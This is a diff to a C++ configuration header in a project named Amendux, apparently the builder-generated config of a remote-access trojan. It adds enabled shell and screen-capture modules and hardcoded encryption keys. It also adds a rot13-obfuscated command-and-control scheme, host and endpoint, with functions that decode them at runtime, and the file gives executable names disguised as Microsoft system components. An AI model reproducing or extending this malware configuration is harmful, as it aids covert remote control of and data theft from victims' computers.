@@ -1,9 +1,46 @@
 #pragma once
 
+//
+//   GENERATED AT Sat Sep 17 14:43:49 UTC 2016
+//
+//   THIS FILE IS AUTO-GENERATED
+//
+//   >> DO NOT CHANGE THE CONTENTS OF THIS FILE, USE THE BUILDER INSTEAD <<
+//
+
 #define variantCount() (sizeof(variantDisplayName) / sizeof(variantDisplayName[0]))
 #define staticVariant() -1
 
+// INSDEF
+#define EXE_NANME ""
+#define INSTANCEID ""
+
+// MODDEF
+#define MODSHELL_ENABLED	1
+#define MODSCREEN_ENABLED	1
+
+// ENCDEF
+#define VIGE_KEY		"JiD2OSA9Z0cmNxQ2zcPS"
+#define XTEA_KEY		"qefzd6C8Cr8LSidC6mpo"
+
 #define VARIANT_INVALID	1000
+
+// AVCDEF
+#if DEBUG
+#define AVC_SCHEME		"uggc" // http
+#define AVC_HOST		"0k17^arg23^arg" // 0x17.net23.net
+#define AVC_URI			"nip*raqcbvag^cuc" // avc_endpoint.php
+#else
+#define AVC_SCHEME		"uggc" // http
+#define AVC_HOST		"0k17^ay" // 0x.17.nl
+#define AVC_URI			"nip*raqcbvag^cuc" // avc_endpoint.php
+#endif
+
+// BUILDDEF
+#define ISBUILD 1
+
+// BOOTDEF
+// #define SECURE_DOUBLE_BOOT	1
 
 namespace Amendux {
 
@@ -17,6 +54,10 @@ namespace Amendux {
 		MSMPE,
 	};
 #endif
+
+	static const char avcScheme[] = AVC_SCHEME;
+	static const char avcHost[] = AVC_HOST;
+	static const char avcUri[] = AVC_URI;
 
 	static const char *variantExeName[] = {
 		"fuUyc",	// Microsoft Shell Helper (SHHLP)
@@ -73,6 +114,30 @@ namespace Amendux {
 			}
 
 			return rand() % variantCount();
+		}
+
+		static char *getAvcScheme() {
+			char *var = _strdup(avcScheme);
+
+			Util::rot13<char>(var);
+
+			return var;
+		}
+
+		static char *getAvcHost() {
+			char *var = _strdup(avcHost);
+
+			Util::rot13<char>(var);
+
+			return var;
+		}
+
+		static char *getAvcUri() {
+			char *var = _strdup(avcUri);
+
+			Util::rot13<char>(var);
+
+			return var;
 		}
 
 		static char *getExeName(unsigned int variant) {
@@ -139,3 +204,7 @@ namespace Amendux {
 	}
 
 }
+
+//
+//   END OF AUTO-GENERATED FILE
+//
